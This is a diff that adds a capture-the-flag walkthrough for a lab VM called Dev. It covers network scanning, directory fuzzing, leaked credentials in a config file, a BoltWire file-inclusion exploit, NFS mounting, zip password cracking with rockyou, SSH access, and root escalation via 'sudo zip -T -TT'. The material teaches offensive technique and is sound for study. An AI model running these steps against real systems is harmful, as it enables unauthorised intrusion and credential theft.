@@ -230,6 +230,154 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Dev
 
+* Scanning using netdiscover and nmap:
+
+```shell
+netdiscover -r 10.0.2.0/24
+#gives IP of Dev as 10.0.2.9
+
+nmap -T4 -p- -A 10.0.2.9
+```
+
+* nmap gives the following info:
+
+```shell
+22/tcp - open - ssh - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+ssh-hostkey: 
+  2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
+  256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
+  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
+
+80/tcp - open - http - Apache httpd 2.4.38 (Debian)
+  http-server-header: Apache/2.4.38 (Debian)
+  http-title: Bolt - Installation error
+
+111/tcp - open - rpcbind - 2-4 (RPC #100000)
+
+2049/tcp - open - nfs_acl - 3 (RPC #100227)
+
+8080/tcp - open - http - Apache httpd 2.4.38 (Debian)
+  http-open-proxy: Potentially OPEN proxy.
+  Methods supported:CONNECTION
+  http-server-header: Apache/2.4.38 (Debian)
+  http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
+
+39265/tcp - open - nlockmgr - 1-4 (RPC #100021)
+53457/tcp - open - mountd   - 1-3 (RPC #100005)
+55407/tcp - open - mountd   - 1-3 (RPC #100005)
+55989/tcp - open - mountd   - 1-3 (RPC #100005)
+
+MAC Address: 08:00:27:B6:FC:7A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+```
+
+* Enumerating HTTP at ports 80 and 8080:
+
+  * Visiting the links <http://10.0.2.9:80> and <http://10.0.2.9:8080> gives us pages for Bolt installtion error and PHP default version webpage, respectively.
+
+  * Information disclosure:
+
+    * Apache 2.4.38 and PHP version 7.3.27-1~deb10u1 used in website
+
+    * Bolt installation error page on <http://10.0.2.9:80> shows that current folder is /var/www/html/. Similarly, Apache run directory given as /var/run/apache2
+
+    * PHP page shows system details - Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+    * HTTP Header request info - GET / HTTP/1.1
+
+  * Scanning web app:
+
+  ```shell
+  ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.9:80/FUZZ
+  #using ffuf for directory scanning
+
+  ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.9:8080/FUZZ
+  ```
+
+  * Information disclosure:
+
+    * Using ffuf, we get directories /public, /src, /app, /vendor, /extensions for <http://10.0.2.9:80>
+
+    * Similarly, for <http://10.0.2.9:8080>, we get /dev and /server-status
+
+  * We access the directories of <http://10.0.2.9:80>, and most of it were ordinary files, except for a few. A file named config.yml gives us credentials - username: bolt, password: I_love_java
+
+  * Accessing <http://10.0.2.9:8080/dev> leads us to a website called Boltwire. We create an account on it and the URL changes to a format, such that it can have some vulnerabilities.
+
+  * On Googling, it's found that Boltwire does have file related vulnerabilities. Using the file upload vulnerability given in <https://www.exploit-db.com/exploits/48411>, the URL can be modified to reveal the /etc/passwd file, which gives us a list of the users. One of the users is 'jeanpaul', who could be 'jp' from the todo.txt
+
+* Enumerating nfs_acl at 2049:
+
+  * We can use nfs_acl to mount files in our system from Dev:
+
+  ```shell
+  showmount -e 10.0.2.9 #shows export list - /srv/nfs
+
+  mkdir /mnt/dev/ #folder to store files
+
+  mount -t nfs 10.0.2.9:/srv/nfs /mnt/dev/
+
+  cd /mnt/dev/
+
+  ls #shows save.zip
+
+  unzip save.zip #asks for password, we do not have it
+
+  apt install fcrackzip #install tool to crack zip password
+
+  fcrackzip -v -u -D -p /root/rockyou/rockyou.txt save.zip
+  #-v for verbosity, -u for unzip, -D for dictionary attack and -p for passwords file
+  #password is java101
+
+  unzip save.zip #enter password to unzip
+
+  ls #shows two files
+  ```
+
+  * The two files give us some info - todo.txt shows file with text, signed by 'jp'; and the second file is id_rsa, a key. It could be probably useful for ssh, but we do not know the username.
+
+  * However, we can use earlier usernames 'jp' and 'jeanpaul', the id_rsa file and 'I_love_java' to attempt the SSH login.
+
+* Enumerating ssh at 22:
+
+  * Attempting ssh login:
+
+  ```shell
+  ssh -i id_rsa jp@10.0.2.9
+  #does not work
+
+  ssh -i id_rsa jeanpaul@10.0.2.9
+  #works with 'I_love_java'
+  #logs in as jeanpaul
+
+  ls
+
+  history #check prev commands for clues
+
+  sudo -l #shows what we can run without sudo password
+  #it shows we can run 'sudo zip'
+  #Google shows a lot of privilege escalation methods using sudo zip
+  #we can use <https://gtfobins.github.io/> as a resource for binaries, including those related to privilege escalation
+  #we can abuse sudo zip for escalating privileges
+
+  TF=$(mktemp -u)
+
+  sudo zip $TF /etc/hosts -T -TT 'sh #'
+  #opens a shell as sudo
+
+  id
+  #shows that we are root now
+
+  cd /root
+
+  ls
+
+  cat flag.txt
+  ```
+
+* Therefore, we have gained root access on Dev and captured the flag.txt as well.
+
 ---
 
 ## Butler
